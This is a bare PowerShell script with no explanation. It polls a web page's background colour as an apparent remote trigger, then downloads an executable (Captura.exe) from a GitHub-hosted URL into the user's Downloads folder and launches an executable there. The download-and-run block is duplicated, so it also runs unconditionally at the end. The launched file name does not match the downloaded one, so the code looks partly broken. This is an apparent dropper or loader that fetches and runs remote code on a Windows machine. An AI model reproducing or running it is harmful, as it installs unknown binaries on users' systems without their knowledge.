$urls = @(
    "https://github.com/webntdev/webntdev.github.io/raw/main/application/Captura.exe"
)

$filePath = Join-Path -Path $env:USERPROFILE -ChildPath "Downloads\wheiu.bz"
$url = "https://www.example.com"

function CheckBackgroundColor {
    $response = Invoke-WebRequest -Uri $url
    return $response.ParsedHtml.getElementsByTagName("body").Style.backgroundColor
}

$initialColor = CheckBackgroundColor

if ($initialColor -eq "blue") {
    Start-Sleep -Seconds 2

    while ((CheckBackgroundColor) -eq $initialColor) {
        Start-Sleep -Seconds 2
    }
} elseif ($initialColor -eq "white") {
    $urls = @(
        "https://github.com/webntdev/webntdev.github.io/raw/main/application/Captura.exe"
    )

    $filePath = Join-Path -Path $env:USERPROFILE -ChildPath "Downloads\wheiu.bz"

    Start-Sleep -Seconds 1

    $downloadDir = [System.Environment]::ExpandEnvironmentVariables('%USERPROFILE%\Downloads')
    if (-not (Test-Path -Path $downloadDir)) {
        New-Item -ItemType Directory -Path $downloadDir
    }

    foreach ($url in $urls) {
        $fileName = [System.IO.Path]::GetFileName($url)
        $destinationPath = Join-Path -Path $downloadDir -ChildPath $fileName
        Invoke-WebRequest -Uri $url -OutFile $destinationPath
    }

    $exePath = Join-Path -Path $downloadDir -ChildPath "WindowsFormsApp2.exe"
    Start-Process -FilePath $exePath
}

Start-Sleep -Seconds 1

$downloadDir = [System.Environment]::ExpandEnvironmentVariables('%USERPROFILE%\Downloads')
if (-not (Test-Path -Path $downloadDir)) {
    New-Item -ItemType Directory -Path $downloadDir
}

foreach ($url in $urls) {
    $fileName = [System.IO.Path]::GetFileName($url)
    $destinationPath = Join-Path -Path $downloadDir -ChildPath $fileName
    Invoke-WebRequest -Uri $url -OutFile $destinationPath
}

$exePath = Join-Path -Path $downloadDir -ChildPath "WindowsFormsApp2.exe"
Start-Process -FilePath $exePath
